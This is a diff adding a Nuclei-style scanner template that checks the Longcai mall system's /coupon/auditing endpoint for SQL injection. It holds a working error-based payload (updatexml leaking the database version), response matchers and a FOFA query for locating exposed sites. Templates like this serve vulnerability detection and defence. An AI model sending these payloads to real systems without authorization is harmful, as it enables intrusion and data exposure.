@@ -1,0 +1,38 @@
+id: longcai-auditing-sqli
+info:
+  name: 龙采商城系统 auditing 接口存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://cn-sec.com/archives/4251190.html
+    - https://mp.weixin.qq.com/s/fIynaT38RPFFbsB0SDr2sQ
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: body="/pc2.0/index/index"
+    tips:
+    repair:
+    version:
+  tags: longcai,sqli
+
+http:
+  - raw:
+      - |
+        POST /coupon/auditing HTTP/1.1
+        Host: {{Hostname}}
+
+        id=1%20and%20updatexml(1,concat(0x7e,@@version,0x7e),1)
+    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+
+      - type: dsl
+        dsl:
+          - contains_all(body,'syntax error, unexpected')
+          - contains_all(body,'XPATH syntax error')
+        condition: or
